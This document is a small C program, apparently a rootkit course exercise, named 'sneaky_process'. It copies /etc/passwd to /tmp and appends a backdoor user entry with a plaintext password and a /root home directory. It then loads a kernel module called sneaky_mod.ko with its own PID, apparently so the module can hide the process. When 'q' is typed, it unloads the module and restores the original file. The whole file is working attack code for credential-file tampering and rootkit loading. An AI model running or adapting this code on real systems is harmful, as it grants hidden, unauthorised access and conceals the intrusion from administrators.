#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(void) {
    //print process ID
    pid_t pid = getpid();
    printf("sneaky_process pid = %d\n", pid);
    //copt passwd file
    system("cp /etc/passwd /tmp");
    //add new line to passwd
    // FILE *out = fopen("/etc/passwd", "w");  
    // fprintf(out, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");  
    // fclose(out);  
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
         "/etc/passwd");
    //load module
    char buffer [100];
    snprintf(buffer, 100, "insmod sneaky_mod.ko pid=%d", pid);
    system(buffer);
    //loop
    char cur;
    do {
        cur = getchar();
    } while (cur != 'q');
    //unload module
    system("rmmod sneaky_mod");
    //restore passwd
    system("cp /tmp/passwd /etc");
    return EXIT_SUCCESS;
}